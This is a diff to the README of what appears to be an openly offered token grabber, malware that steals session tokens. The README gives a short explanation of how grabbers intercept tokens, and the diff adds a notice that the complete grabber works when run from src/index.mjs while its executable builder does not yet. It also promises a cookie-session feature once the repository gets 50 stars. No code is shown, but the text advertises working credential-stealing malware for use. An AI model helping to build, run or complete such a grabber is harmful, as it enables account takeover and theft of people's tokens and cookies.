@@ -26,7 +26,9 @@ This README provides a brief overview of what a token grabber is, its potential 
 Token grabbers work by intercepting and capturing tokens as they are transmitted between a client and a server. This interception can occur through various means, such as exploiting vulnerabilities, man-in-the-middle attacks, or through malicious software or scripts injected into a user's device. 📂
 
 # important 
-- **50** damn stars to this repository and add cookie session ⭐
+- ⚠️ Important notice: the complete code of the grabber works perfectly if initiated from ["src/index.mjs"](./src/index.mjs), but if attempted to make an executable with ["builder.mjs"](./builder.mjs), it is created but doesn't function **(this will be completed when I have more time and support)**.
+
+  - ⭐ **50** damn stars to this repository and add cookie session 
 
 # Requirements
 - Downloads NodeJS Version [LTS](https://nodejs.org/en)
